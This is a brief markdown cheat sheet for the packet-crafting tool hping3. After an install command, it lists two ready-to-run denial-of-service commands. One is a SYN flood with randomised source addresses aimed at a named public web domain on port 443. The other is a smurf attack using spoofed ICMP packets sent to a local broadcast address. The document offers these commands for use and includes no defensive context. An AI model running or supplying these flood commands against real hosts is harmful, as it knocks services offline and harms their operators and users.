# hping3

>hping3 is a command-line utility for crafting and sending custom TCP/IP packets. It is a versatile tool that allows you to perform various tasks, such as network scanning, fingerprinting, and testing network security.

```
sudo apt install hping3
```
>SYN-FLOOD attack

```
hping3 --count 15000 --data 120 --syn --win 64 -p 443 --flood --rand-source www.ewubdserver.com
```
>Dos smurf attack

```
sudo hping3 --icmp --count 50000 --spoof 192.168.56.5 192.168.56.255 --flood
```